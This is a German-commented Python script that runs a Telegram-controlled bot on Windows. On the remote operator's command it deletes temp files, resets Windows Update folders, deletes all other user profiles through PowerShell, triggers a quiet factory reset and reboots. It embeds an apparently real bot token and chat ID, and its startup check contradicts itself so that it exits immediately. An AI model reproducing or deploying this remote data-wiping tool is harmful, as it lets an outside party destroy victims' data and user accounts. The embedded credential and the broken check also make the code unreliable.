#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
factoryreset.py - Windows Factory Reset über Telegram
Nur ein Telegram Bot Token
"""

import os
import sys
import subprocess
import telebot
from telebot import types
import ctypes
import winreg
import time
import shutil

# ==================== KONFIGURATION ====================
BOT_TOKEN = "8746163440:AAFbrUUlkEal0eidxekyBH1yrDREow4JtEo"
MASTER_ID = "6976176725"

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== WINDOWS RESET FUNCTIONS ====================
def wipe_temp_files():
    """Löscht temporäre Dateien"""
    paths = [
        os.environ.get('TEMP', ''),
        os.environ.get('TMP', ''),
        r'C:\Windows\Temp',
        r'C:\Windows\Prefetch',
        r'C:\Windows\SoftwareDistribution\Download'
    ]
    
    deleted = 0
    for path in paths:
        if os.path.exists(path):
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        try:
                            os.remove(os.path.join(root, file))
                            deleted += 1
                        except:
                            pass
            except:
                pass
    return f"✅ {deleted} temporäre Dateien gelöscht"

def reset_windows_updates():
    """Setzt Windows Update zurück"""
    try:
        commands = [
            'net stop wuauserv',
            'net stop cryptSvc',
            'net stop bits',
            'net stop msiserver',
            'ren C:\\Windows\\SoftwareDistribution SoftwareDistribution.old',
            'ren C:\\Windows\\System32\\catroot2 catroot2.old',
            'net start wuauserv',
            'net start cryptSvc',
            'net start bits',
            'net start msiserver'
        ]
        
        for cmd in commands:
            subprocess.run(cmd, shell=True, capture_output=True)
        return "✅ Windows Update zurückgesetzt"
    except Exception as e:
        return f"❌ Fehler: {e}"

def remove_user_profiles():
    """Entfernt Benutzerprofile"""
    try:
        # PowerShell: Alle Profile außer aktuellem löschen
        ps_script = '''
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $profiles = Get-WmiObject Win32_UserProfile | Where-Object { $_.LocalPath -notlike "*$currentUser*" }
        foreach ($profile in $profiles) {
            $profile.Delete()
        }
        '''
        subprocess.run(['powershell', '-Command', ps_script], capture_output=True)
        return "✅ Benutzerprofile entfernt"
    except:
        return "⚠️ Profil-Entfernung teilweise erfolgreich"

def factory_reset_windows():
    """Führt Windows Factory Reset durch"""
    try:
        # 1. Temp Files
        bot.send_message(MASTER_ID, "🗑️ Lösche temporäre Dateien...")
        wipe_temp_files()
        
        # 2. Reset Updates
        bot.send_message(MASTER_ID, "🔄 Setze Windows Update zurück...")
        reset_windows_updates()
        
        # 3. Remove User Data
        bot.send_message(MASTER_ID, "👤 Entferne Benutzerprofile...")
        remove_user_profiles()
        
        # 4. System Reset Command
        cmd = 'systemreset --factoryreset --quiet'
        subprocess.run(cmd, shell=True)
        
        return "✅ Factory Reset eingeleitet - Neustart in 60 Sekunden"
    except Exception as e:
        return f"❌ Fehler: {e}"

# ==================== TELEGRAM COMMANDS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('🗑️ Temp Files löschen')
    btn2 = types.KeyboardButton('🔄 Updates zurücksetzen')
    btn3 = types.KeyboardButton('👤 Profile entfernen')
    btn4 = types.KeyboardButton('💀 FACTORY RESET')
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_message(message.chat.id,
                    "⚠️ **WINDOWS FACTORY RESET BOT** ⚠️\n"
                    "Achtung: Destruktive Aktionen!",
                    parse_mode='Markdown',
                    reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    text = message.text
    
    if text == '🗑️ Temp Files löschen':
        result = wipe_temp_files()
        bot.send_message(message.chat.id, result)
    
    elif text == '🔄 Updates zurücksetzen':
        result = reset_windows_updates()
        bot.send_message(message.chat.id, result)
    
    elif text == '👤 Profile entfernen':
        msg = bot.send_message(message.chat.id, 
                              "⚠️ Alle Benutzerprofile außer aktuellem werden gelöscht!\n"
                              "Bestätige mit 'JA'")
        bot.register_next_step_handler(msg, confirm_profile_removal)
    
    elif text == '💀 FACTORY RESET':
        msg = bot.send_message(message.chat.id,
                              "💀 **LETZTE WARNUNG!** 💀\n"
                              "Windows wird auf Werkseinstellungen zurückgesetzt!\n"
                              "Alle Daten gehen verloren!\n"
                              "Bestätige mit 'FACTORY'",
                              parse_mode='Markdown')
        bot.register_next_step_handler(msg, confirm_factory_reset)

def confirm_profile_removal(message):
    if message.text.upper() == 'JA':
        result = remove_user_profiles()
        bot.send_message(message.chat.id, result)
    else:
        bot.send_message(message.chat.id, "❌ Abgebrochen")

def confirm_factory_reset(message):
    if message.text.upper() == 'FACTORY':
        bot.send_message(message.chat.id, "💀 STARTE FACTORY RESET...")
        result = factory_reset_windows()
        bot.send_message(message.chat.id, result)
        
        # Countdown zum Neustart
        for i in range(10, 0, -1):
            bot.send_message(message.chat.id, f"🔄 Neustart in {i} Sekunden...")
            time.sleep(1)
        
        # Neustart
        subprocess.run('shutdown /r /t 5', shell=True)
    else:
        bot.send_message(message.chat.id, "❌ Abgebrochen")

# ==================== MAIN ====================
def main():
    print("😈 Factory Reset Bot gestartet")
    print(f"Token: {BOT_TOKEN[:15]}...")
    
    try:
        bot.send_message(MASTER_ID, "✅ Factory Reset Bot aktiv")
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"❌ Fehler: {e}")
        time.sleep(10)
        main()

if __name__ == "__main__":
    if BOT_TOKEN == "8746163440:AAFbrUUlkEal0eidxekyBH1yrDREow4JtEo":
        print("❌ Token nicht gesetzt!")
        sys.exit(1)
    main()
